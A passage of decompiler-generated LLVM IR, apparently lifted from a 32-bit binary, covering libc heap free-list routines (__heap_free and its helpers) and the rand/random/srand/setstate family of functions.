  %v3_1000fc60 = icmp eq i32 %v3_1000fc58, 0
  br i1 %v3_1000fc60, label %dec_label_pc_1000fc70, label %dec_label_pc_1000fc68

dec_label_pc_1000fc68:                            ; preds = %dec_label_pc_1000fc58
  %v2_1000fc68 = add i32 %v3_1000fc58, 4
  %v3_1000fc68 = inttoptr i32 %v2_1000fc68 to i32*
  store i32 %v3_1000fc5c, i32* %v3_1000fc68, align 4
  ret i32 %v2_1000fc10

dec_label_pc_1000fc70:                            ; preds = %dec_label_pc_1000fc58
  %v1_1000fc70 = load i32, i32* @r8, align 4
  %v2_1000fc70 = inttoptr i32 %v1_1000fc70 to i32*
  store i32 %v3_1000fc5c, i32* %v2_1000fc70, align 4
  ret i32 %v2_1000fc10

dec_label_pc_1000fc78:                            ; preds = %dec_label_pc_1000fc38
  %v2_1000fc78 = sub i32 %v2_1000fc10, %v1_1000fc2c
  %v1_1000fc80 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000fc80 = inttoptr i32 %v1_1000fc80 to i32*
  store i32 %v2_1000fc78, i32* %v2_1000fc80, align 4
  ret i32 %v1_1000fc2c

dec_label_pc_1000fc88:                            ; preds = %dec_label_pc_1000fc10
  %v1_1000fc88 = add i32 %v0_1000fc88, 4
  %v2_1000fc88 = inttoptr i32 %v1_1000fc88 to i32*
  %v3_1000fc88 = load i32, i32* %v2_1000fc88, align 4
  store i32 %v3_1000fc88, i32* %r11.global-to-local, align 4
  %v3_1000fc8c = icmp eq i32 %v3_1000fc88, 0
  br i1 %v3_1000fc8c, label %dec_label_pc_1000fc8c.dec_label_pc_1000fc94.loopexit_crit_edge, label %dec_label_pc_1000fc10

dec_label_pc_1000fc8c.dec_label_pc_1000fc94.loopexit_crit_edge: ; preds = %dec_label_pc_1000fc88
  br label %dec_label_pc_1000fc94

dec_label_pc_1000fc94:                            ; preds = %entry, %dec_label_pc_1000fc8c.dec_label_pc_1000fc94.loopexit_crit_edge, %dec_label_pc_1000fc24, %dec_label_pc_1000fc2c
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_1000fc88, { 1, 2, 0 }
  uselistorder i32 %v0_1000fc58, { 1, 0 }
  uselistorder i32 %v1_1000fc2c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_1000fc10, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 %v0_1000fc88, { 0, 2, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1000fc94, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_1000fc58, { 1, 0 }
  uselistorder label %dec_label_pc_1000fc10, { 1, 0 }
}

define i32 @__heap_link_free_area(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000fc9c = icmp eq i32 %arg3, 0
  %v2_1000fca0 = add i32 %arg2, 4
  %v3_1000fca0 = inttoptr i32 %v2_1000fca0 to i32*
  store i32 %arg4, i32* %v3_1000fca0, align 4
  %v2_1000fca4 = add i32 %arg2, 8
  %v3_1000fca4 = inttoptr i32 %v2_1000fca4 to i32*
  store i32 %arg3, i32* %v3_1000fca4, align 4
  br i1 %v3_1000fc9c, label %dec_label_pc_1000fcb4, label %dec_label_pc_1000fcac

dec_label_pc_1000fcac:                            ; preds = %entry
  %v2_1000fcac = add i32 %arg3, 4
  %v3_1000fcac = inttoptr i32 %v2_1000fcac to i32*
  store i32 %arg2, i32* %v3_1000fcac, align 4
  br label %dec_label_pc_1000fcb8

dec_label_pc_1000fcb4:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000fcb8

dec_label_pc_1000fcb8:                            ; preds = %dec_label_pc_1000fcac, %dec_label_pc_1000fcb4
  %v3_1000fcb8 = icmp eq i32 %arg4, 0
  %v0_1000fcbc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000fcb8, i32 %v0_1000fcbc)
  %v2_1000fcc0 = add i32 %arg4, 8
  %v3_1000fcc0 = inttoptr i32 %v2_1000fcc0 to i32*
  store i32 %arg2, i32* %v3_1000fcc0, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1, 4, 3 }
  uselistorder label %dec_label_pc_1000fcb8, { 1, 0 }
}

define i32 @__heap_link_free_area_after(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000fcc8 = icmp eq i32 %arg3, 0
  br i1 %v3_1000fcc8, label %dec_label_pc_1000fcd8, label %dec_label_pc_1000fcd0

dec_label_pc_1000fcd0:                            ; preds = %entry
  %v2_1000fcd0 = add i32 %arg3, 4
  %v3_1000fcd0 = inttoptr i32 %v2_1000fcd0 to i32*
  store i32 %arg2, i32* %v3_1000fcd0, align 4
  br label %dec_label_pc_1000fcdc

dec_label_pc_1000fcd8:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000fcdc

dec_label_pc_1000fcdc:                            ; preds = %dec_label_pc_1000fcd0, %dec_label_pc_1000fcd8
  %v2_1000fcdc = add i32 %arg2, 8
  %v3_1000fcdc = inttoptr i32 %v2_1000fcdc to i32*
  store i32 %arg3, i32* %v3_1000fcdc, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000fcdc, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_1000fcfc = load i32, i32* %arg1, align 4
  store i32 %v2_1000fcfc, i32* @r31, align 4
  %v2_1000fd00 = add i32 %arg3, %arg2
  store i32 %v2_1000fd00, i32* %r3.global-to-local, align 4
  %v3_1000fd147 = icmp eq i32 %v2_1000fcfc, 0
  %v1_1000fd188 = add i32 %v2_1000fcfc, 12
  %tmp69 = icmp uge i32 %v1_1000fd188, %arg2
  %or.cond10 = or i1 %v3_1000fd147, %tmp69
  br i1 %or.cond10, label %dec_label_pc_1000fd24, label %dec_label_pc_1000fd0c

dec_label_pc_1000fd0c:                            ; preds = %entry, %dec_label_pc_1000fd0c
  %v0_1000fd6c11 = phi i32 [ %v3_1000fd10, %dec_label_pc_1000fd0c ], [ %v2_1000fcfc, %entry ]
  store i32 %v0_1000fd6c11, i32* %r11.global-to-local, align 4
  %v1_1000fd10 = add i32 %v0_1000fd6c11, 4
  %v2_1000fd10 = inttoptr i32 %v1_1000fd10 to i32*
  %v3_1000fd10 = load i32, i32* %v2_1000fd10, align 4
  store i32 %v3_1000fd10, i32* @r31, align 4
  %v3_1000fd14 = icmp eq i32 %v3_1000fd10, 0
  %v1_1000fd18 = add i32 %v3_1000fd10, 12
  %tmp6 = icmp uge i32 %v1_1000fd18, %arg2
  %or.cond = or i1 %v3_1000fd14, %tmp6
  br i1 %or.cond, label %dec_label_pc_1000fd24, label %dec_label_pc_1000fd0c

dec_label_pc_1000fd24:                            ; preds = %dec_label_pc_1000fd0c, %entry
  %v0_1000fd60.lcssa = phi i32 [ 0, %entry ], [ %v0_1000fd6c11, %dec_label_pc_1000fd0c ]
  %v0_1000fd6c.lcssa = phi i32 [ %v2_1000fcfc, %entry ], [ %v3_1000fd10, %dec_label_pc_1000fd0c ]
  %v3_1000fd14.lcssa = phi i1 [ %v3_1000fd147, %entry ], [ %v3_1000fd14, %dec_label_pc_1000fd0c ]
  br i1 %v3_1000fd14.lcssa, label %dec_label_pc_1000fddc, label %dec_label_pc_1000fd2c

dec_label_pc_1000fd2c:                            ; preds = %dec_label_pc_1000fd24
  %v1_1000fd2c = inttoptr i32 %v0_1000fd6c.lcssa to i32*
  %v2_1000fd2c = load i32, i32* %v1_1000fd2c, align 4
  %v2_1000fd30 = sub i32 %v0_1000fd6c.lcssa, %v2_1000fd2c
  %v1_1000fd34 = add i32 %v2_1000fd30, 12
  %v3_1000fd38 = icmp ugt i32 %v1_1000fd34, %v2_1000fd00
  br i1 %v3_1000fd38, label %dec_label_pc_1000fddc, label %dec_label_pc_1000fd40

dec_label_pc_1000fd40:                            ; preds = %dec_label_pc_1000fd2c
  %v4_1000fd38 = icmp eq i32 %v1_1000fd34, %v2_1000fd00
  %v2_1000fd44 = add i32 %v2_1000fd2c, %arg3
  store i32 %v2_1000fd44, i32* @r29, align 4
  br i1 %v4_1000fd38, label %dec_label_pc_1000fd4c, label %dec_label_pc_1000fd7c

dec_label_pc_1000fd4c:                            ; preds = %dec_label_pc_1000fd40
  %v3_1000fd4c = icmp eq i32 %v0_1000fd60.lcssa, 0
  br i1 %v3_1000fd4c, label %dec_label_pc_1000fdd0, label %dec_label_pc_1000fd54

dec_label_pc_1000fd54:                            ; preds = %dec_label_pc_1000fd4c
  %v1_1000fd54 = add i32 %v0_1000fd60.lcssa, 12
  %v4_1000fd58 = icmp eq i32 %v1_1000fd54, %arg2
  br i1 %v4_1000fd58, label %dec_label_pc_1000fd60, label %dec_label_pc_1000fdd0

dec_label_pc_1000fd60:                            ; preds = %dec_label_pc_1000fd54
  %v1_1000fd60 = inttoptr i32 %v0_1000fd60.lcssa to i32*
  %v2_1000fd60 = load i32, i32* %v1_1000fd60, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_1000fd68 = add i32 %v0_1000fd60.lcssa, 8
  %v2_1000fd68 = inttoptr i32 %v1_1000fd68 to i32*
  %v3_1000fd68 = load i32, i32* %v2_1000fd68, align 4
  %v2_1000fd70 = add i32 %v2_1000fd60, %v2_1000fd44
  store i32 %v2_1000fd70, i32* @r29, align 4
  %v5_1000fd74 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v0_1000fd6c.lcssa, i32 %v3_1000fd68, i32 %v2_1000fd00)
  store i32 %v5_1000fd74, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000fdd0

dec_label_pc_1000fd7c:                            ; preds = %dec_label_pc_1000fd40
  %v1_1000fd7c = add i32 %v0_1000fd6c.lcssa, 4
  %v2_1000fd7c = inttoptr i32 %v1_1000fd7c to i32*
  %v3_1000fd7c = load i32, i32* %v2_1000fd7c, align 4
  %v3_1000fd80 = icmp eq i32 %v3_1000fd7c, 0
  br i1 %v3_1000fd80, label %dec_label_pc_1000fdb8, label %dec_label_pc_1000fd88

dec_label_pc_1000fd88:                            ; preds = %dec_label_pc_1000fd7c
  %v1_1000fd88 = inttoptr i32 %v3_1000fd7c to i32*
  %v2_1000fd88 = load i32, i32* %v1_1000fd88, align 4
  %v2_1000fd8c = sub i32 %v3_1000fd7c, %v2_1000fd88
  %v1_1000fd90 = add i32 %v2_1000fd8c, 12
  %v4_1000fd94 = icmp eq i32 %v2_1000fd00, %v1_1000fd90
  br i1 %v4_1000fd94, label %dec_label_pc_1000fd9c, label %dec_label_pc_1000fdb8

dec_label_pc_1000fd9c:                            ; preds = %dec_label_pc_1000fd88
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1000fda8 = add i32 %v2_1000fd88, %v2_1000fd44
  store i32 %v2_1000fda8, i32* @r29, align 4
  store i32 %v3_1000fd7c, i32* @r31, align 4
  %v5_1000fdb0 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v3_1000fd7c, i32 %v0_1000fd60.lcssa, i32 %v2_1000fd00)
  store i32 %v5_1000fdb0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000fdd0

dec_label_pc_1000fdb8:                            ; preds = %dec_label_pc_1000fd88, %dec_label_pc_1000fd7c
  %v2_1000fdb8 = add i32 %v0_1000fd6c.lcssa, %arg3
  store i32 %v2_1000fdb8, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268500432, i32* @lr, align 4
  %v5_1000fdcc = call i32 @__heap_link_free_area(i32* %arg1, i32 %v2_1000fdb8, i32 %v0_1000fd60.lcssa, i32 %v3_1000fd7c)
  store i32 %v5_1000fdcc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000fdd0

dec_label_pc_1000fdd0:                            ; preds = %dec_label_pc_1000fd54, %dec_label_pc_1000fd4c, %dec_label_pc_1000fd9c, %dec_label_pc_1000fd60, %dec_label_pc_1000fdb8
  %v0_1000fdd0 = load i32, i32* @r31, align 4
  store i32 %v0_1000fdd0, i32* @r30, align 4
  %v0_1000fdd4 = load i32, i32* @r29, align 4
  %v2_1000fdd4 = inttoptr i32 %v0_1000fdd0 to i32*
  store i32 %v0_1000fdd4, i32* %v2_1000fdd4, align 4
  br label %dec_label_pc_1000fdf8

dec_label_pc_1000fddc:                            ; preds = %dec_label_pc_1000fd2c, %dec_label_pc_1000fd24
  %v2_1000fddc = add i32 %v2_1000fd00, -12
  %v3_1000fddc = inttoptr i32 %v2_1000fddc to i32*
  store i32 %arg3, i32* %v3_1000fddc, align 4
  %v0_1000fde0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000fde0 = add i32 %v0_1000fde0, -12
  store i32 %v1_1000fde0, i32* @r30, align 4
  %v0_1000fde4 = load i32, i32* %r11.global-to-local, align 4
  %v0_1000fde8 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000fde8, i32* %r3.global-to-local, align 4
  %v0_1000fdec = load i32, i32* @r31, align 4
  store i32 268500472, i32* @lr, align 4
  %v4_1000fdf4 = inttoptr i32 %v0_1000fde8 to i32*
  %v5_1000fdf4 = call i32 @__heap_link_free_area(i32* %v4_1000fdf4, i32 %v1_1000fde0, i32 %v0_1000fde4, i32 %v0_1000fdec)
  store i32 %v5_1000fdf4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000fdf8

dec_label_pc_1000fdf8:                            ; preds = %dec_label_pc_1000fdd0, %dec_label_pc_1000fddc
  %v0_1000fdfc = load i32, i32* @r30, align 4
  store i32 %v0_1000fdfc, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000fdfc

; uselistorder directives
  uselistorder i32 %v3_1000fd7c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1000fd34, { 1, 0 }
  uselistorder i32 %v0_1000fd6c.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_1000fd60.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_1000fd10, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_1000fd00, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 8, 2, 6, 9, 3, 10, 4, 11, 5, 7, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2 }
  uselistorder i32 -12, { 2, 3, 1, 4, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000fdf8, { 1, 0 }
  uselistorder label %dec_label_pc_1000fdd0, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000fd0c, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_1000fe10 = call i32 @random()
  ret i32 %v0_1000fe10

; uselistorder directives
  uselistorder i32 ()* @random, { 9, 8, 0, 1, 2, 3, 4, 5, 6, 7 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_1000fe28 = ptrtoint i32* %stack_var_-52 to i32
  store i32 ptrtoint (i32* @global_var_10028468.644 to i32), i32* @r29, align 4
  store i32 %v2_1000fe28, i32* @r3, align 4
  %v0_1000fe40 = call i32 @__pthread_return_void()
  %v0_1000fe48 = call i32 @__pthread_return_0()
  %v2_1000fe50 = ptrtoint i32* %stack_var_-56 to i32
  %v3_1000fe58 = call i32 @__GI_random_r(i32* inttoptr (i32 268600448 to i32*), i32 %v2_1000fe50)
  store i32 %v2_1000fe28, i32* @r3, align 4
  %v0_1000fe64 = call i32 @__pthread_return_void()
  %v3_1000fe6c = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_1000fe6c
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10028468.644 to i32), i32* %r29.global-to-local, align 4
  %v2_1000fea4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000fea4, i32* @r3, align 4
  %v0_1000feac = call i32 @__pthread_return_void()
  %v0_1000feb4 = call i32 @__pthread_return_0()
  store i32 268500688, i32* @lr, align 4
  %v3_1000fecc = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_10028480)
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_1000fed4 = icmp slt i32 %v3_1000fecc, 0
  store i32 %v2_1000fea4, i32* @r3, align 4
  br i1 %v1_1000fed4, label %dec_label_pc_1000fee8, label %dec_label_pc_1000fee4

dec_label_pc_1000fee4:                            ; preds = %entry
  store i32 ptrtoint (i32** @global_var_10028484.648 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000fee8

dec_label_pc_1000fee8:                            ; preds = %entry, %dec_label_pc_1000fee4
  %v0_1000fee8 = call i32 @__pthread_return_void()
  %v0_1000fef0 = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_1000fef0

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000fee8, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %v2_1000ff14 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000ff14, i32* @r3, align 4
  %v0_1000ff3c = call i32 @__pthread_return_void()
  %v0_1000ff44 = call i32 @__pthread_return_0()
  store i32 %arg1, i32* @r3, align 4
  store i32 268500836, i32* @lr, align 4
  %v4_1000ff60 = inttoptr i32 %arg1 to i32*
  %v5_1000ff60 = call i32 @__GI_initstate_r(i32* %v4_1000ff60, i32 %arg2, i32 %arg3, i32 ptrtoint (i32* @global_var_10028480 to i32))
  store i32 %v2_1000ff14, i32* @r3, align 4
  %v0_1000ff6c = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_10028484.648 to i32)

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000ffa0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000ffa0, i32* @r3, align 4
  %v0_1000ffbc = call i32 @__pthread_return_void()
  %v0_1000ffc4 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_10028480 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 268500952, i32* @lr, align 4
  %v0_1000ffd4 = call i32 @srandom_r()
  store i32 %v2_1000ffa0, i32* @r3, align 4
  %v0_1000ffe0 = call i32 @__pthread_return_void()
  ret i32 %v0_1000ffe0

; uselistorder directives
  uselistorder i32* @global_var_10028480, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10028480 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_1000fff8 = add i32 %tmp, 12
  %v2_1000fff8 = inttoptr i32 %v1_1000fff8 to i32*
  %v3_1000fff8 = load i32, i32* %v2_1000fff8, align 4
  store i32 %v3_1000fff8, i32* %r11.global-to-local, align 4
  %v0_1000fffc = load i32, i32* @lr, align 4
  store i32 %v0_1000fffc, i32* %r0.global-to-local, align 4
  %v1_10010004 = add i32 %arg1, 4
  store i32 %v1_10010004, i32* %r3.global-to-local, align 4
  %v3_10010008 = icmp eq i32 %v3_1000fff8, 0
  %v1_1001000c = add i32 %tmp, 8
  %v2_1001000c = inttoptr i32 %v1_1001000c to i32*
  %v3_1001000c = load i32, i32* %v2_1001000c, align 4
  store i32 %v3_1001000c, i32* %r9.global-to-local, align 4
  br i1 %v3_10010008, label %dec_label_pc_10010018, label %dec_label_pc_10010020

dec_label_pc_10010018:                            ; preds = %entry
  %v2_10010018 = add i32 %v3_1001000c, -4
  %v3_10010018 = inttoptr i32 %v2_10010018 to i32*
  store i32 0, i32* %v3_10010018, align 4
  br label %dec_label_pc_10010038

dec_label_pc_10010020:                            ; preds = %entry
  %v1_10010020 = add i32 %tmp, 4
  %v2_10010020 = inttoptr i32 %v1_10010020 to i32*
  %v3_10010020 = load i32, i32* %v2_10010020, align 4
  %v2_10010024 = sub i32 %v3_10010020, %v3_1001000c
  %v4_10010028 = sdiv i32 %v2_10010024, 4
  %v1_1001002c = mul i32 %v4_10010028, 5
  %v2_10010030 = add i32 %v1_1001002c, %v3_1000fff8
  store i32 %v2_10010030, i32* %r0.global-to-local, align 4
  %v2_10010034 = add i32 %v3_1001000c, -4
  %v3_10010034 = inttoptr i32 %v2_10010034 to i32*
  store i32 %v2_10010030, i32* %v3_10010034, align 4
  br label %dec_label_pc_10010038

dec_label_pc_10010038:                            ; preds = %dec_label_pc_10010018, %dec_label_pc_10010020
  %v0_10010038 = load i32, i32* %r3.global-to-local, align 4
  %v1_10010038 = add i32 %v0_10010038, -4
  %v2_10010038 = inttoptr i32 %v1_10010038 to i32*
  %v3_10010038 = load i32, i32* %v2_10010038, align 4
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10017774.649 to i32), i32* %r9.global-to-local, align 4
  %v2_10010048 = srem i32 %v3_10010038, 5
  store i32 %v2_10010048, i32* %r11.global-to-local, align 4
  %v2_10010058 = icmp ugt i32 %v2_10010048, 4
  %v1_1001005c = mul nsw i32 %v2_10010048, 4
  store i32 %v1_1001005c, i32* %r0.global-to-local, align 4
  %v2_10010064 = add i32 %v1_1001005c, ptrtoint (i32* @global_var_10017774.649 to i32)
  store i32 %v2_10010064, i32* %r10.global-to-local, align 4
  br i1 %v2_10010058, label %dec_label_pc_100100c8, label %dec_label_pc_1001006c

dec_label_pc_1001006c:                            ; preds = %dec_label_pc_10010038
  %v3_10010060 = icmp eq i32 %v2_10010048, 0
  %v1_1001006c = add i32 %v1_1001005c, add (i32 ptrtoint (i32* @global_var_10017774.649 to i32), i32 20)
  %v2_1001006c = inttoptr i32 %v1_1001006c to i32*
  %v3_1001006c = load i32, i32* %v2_1001006c, align 4
  store i32 %v3_1001006c, i32* %r10.global-to-local, align 4
  %v3_10010070 = inttoptr i32 %v2_10010064 to i32*
  %v4_10010070 = load i32, i32* %v3_10010070, align 4
  store i32 %v4_10010070, i32* %r9.global-to-local, align 4
  %v1_10010074 = mul i32 %v3_1001006c, 4
  store i32 %v1_10010074, i32* %r0.global-to-local, align 4
  %v2_10010078 = add i32 %tmp, 16
  %v3_10010078 = inttoptr i32 %v2_10010078 to i32*
  store i32 %v3_1001006c, i32* %v3_10010078, align 4
  %v0_1001007c = load i32, i32* %r9.global-to-local, align 4
  %v2_1001007c = add i32 %tmp, 20
  %v3_1001007c = inttoptr i32 %v2_1001007c to i32*
  store i32 %v0_1001007c, i32* %v3_1001007c, align 4
  %v0_10010080 = load i32, i32* %r3.global-to-local, align 4
  %v1_10010080 = load i32, i32* %r0.global-to-local, align 4
  %v2_10010080 = add i32 %v1_10010080, %v0_10010080
  store i32 %v2_10010080, i32* %r8.global-to-local, align 4
  %v0_10010084 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10010084, i32* %v2_1000fff8, align 4
  br i1 %v3_10010060, label %dec_label_pc_100100bc, label %dec_label_pc_1001008c

dec_label_pc_1001008c:                            ; preds = %dec_label_pc_1001006c
  %v0_1001008c = load i32, i32* %r3.global-to-local, align 4
  %v1_1001008c = add i32 %v0_1001008c, -4
  %v2_1001008c = inttoptr i32 %v1_1001008c to i32*
  %v3_1001008c = load i32, i32* %v2_1001008c, align 4
  %v1_10010090 = load i32, i32* %r7.global-to-local, align 4
  %v2_10010090 = sdiv i32 %v3_1001008c, %v1_10010090
  %v1_10010094 = load i32, i32* %r9.global-to-local, align 4
  %v2_10010094 = add i32 %v1_10010094, %v2_10010090
  store i32 %v2_10010094, i32* %r9.global-to-local, align 4
  %v1_10010098 = mul i32 %v2_10010090, 4
  %v1_1001009c = load i32, i32* %r10.global-to-local, align 4
  %v2_1001009c = sdiv i32 %v2_10010094, %v1_1001009c
  store i32 %v2_1001009c, i32* %r11.global-to-local, align 4
  %v2_100100a0 = add i32 %v1_10010098, %v0_1001008c
  store i32 %v2_100100a0, i32* %r0.global-to-local, align 4
  %v2_100100a4 = add i32 %tmp, 4
  %v3_100100a4 = inttoptr i32 %v2_100100a4 to i32*
  store i32 %v2_100100a0, i32* %v3_100100a4, align 4
  %v0_100100a8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100100a8 = load i32, i32* %r10.global-to-local, align 4
  %v2_100100a8 = mul i32 %v1_100100a8, %v0_100100a8
  store i32 %v2_100100a8, i32* %r11.global-to-local, align 4
  %v1_100100ac = load i32, i32* %r9.global-to-local, align 4
  %v2_100100ac = sub i32 %v1_100100ac, %v2_100100a8
  %v1_100100b0 = mul i32 %v2_100100ac, 4
  %v0_100100b4 = load i32, i32* %r3.global-to-local, align 4
  %v2_100100b4 = add i32 %v1_100100b0, %v0_100100b4
  store i32 %v2_100100b4, i32* %r9.global-to-local, align 4
  store i32 %v2_100100b4, i32* %arg2, align 4
  br label %dec_label_pc_100100bc

dec_label_pc_100100bc:                            ; preds = %dec_label_pc_1001006c, %dec_label_pc_1001008c
  %v0_100100bc = load i32, i32* %r8.global-to-local, align 4
  %v2_100100bc = add i32 %tmp, 24
  %v3_100100bc = inttoptr i32 %v2_100100bc to i32*
  store i32 %v0_100100bc, i32* %v3_100100bc, align 4
  %v0_100100c0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_100100c0, i32* %v2_1001000c, align 4
  %v0_100100dc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_100100d8

dec_label_pc_100100c8:                            ; preds = %dec_label_pc_10010038
  %v0_100100c8 = call i32 @__errno_location()
  store i32 %v0_100100c8, i32* %r3.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_100100d0 = inttoptr i32 %v0_100100c8 to i32*
  store i32 22, i32* %v2_100100d0, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_100100d8

dec_label_pc_100100d8:                            ; preds = %dec_label_pc_100100bc, %dec_label_pc_100100c8
  %v0_100100dc = phi i32 [ %v0_100100dc.pre, %dec_label_pc_100100bc ], [ -1, %dec_label_pc_100100c8 ]
  store i32 %v0_1000fffc, i32* %r0.global-to-local, align 4
  store i32 %v0_100100dc, i32* %r3.global-to-local, align 4
  ret i32 %v0_100100dc

; uselistorder directives
  uselistorder i32 %v0_100100dc, { 1, 0 }
  uselistorder i32 %v3_1001006c, { 1, 0, 2 }
  uselistorder i32 %v1_1001005c, { 2, 1, 0 }
  uselistorder i32 %v2_10010048, { 3, 0, 2, 1 }
  uselistorder i32 %tmp, { 6, 0, 3, 4, 5, 1, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 0 }
  uselistorder label %dec_label_pc_100100d8, { 1, 0 }
  uselistorder label %dec_label_pc_100100bc, { 1, 0 }
  uselistorder label %dec_label_pc_10010038, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_100100ec = add i32 %tmp, 12
  %v2_100100ec = inttoptr i32 %v1_100100ec to i32*
  %v3_100100ec = load i32, i32* %v2_100100ec, align 4
  %v1_100100f8 = add i32 %tmp, 8
  %v2_100100f8 = inttoptr i32 %v1_100100f8 to i32*
  %v3_100100f8 = load i32, i32* %v2_100100f8, align 4
  store i32 %v3_100100f8, i32* %r7.global-to-local, align 4
  %v3_100100fc = icmp eq i32 %v3_100100ec, 0
  br i1 %v3_100100fc, label %dec_label_pc_10010104, label %dec_label_pc_10010120

dec_label_pc_10010104:                            ; preds = %entry
  %v1_10010104 = inttoptr i32 %v3_100100f8 to i32*
  %v2_10010104 = load i32, i32* %v1_10010104, align 4
  %v2_10010108 = mul i32 %v2_10010104, 1103515245
  %v1_1001010c = add i32 %v2_10010108, 12345
  %v1_10010110 = urem i32 %v1_1001010c, -2147483648
  store i32 %v1_10010110, i32* %r9.global-to-local, align 4
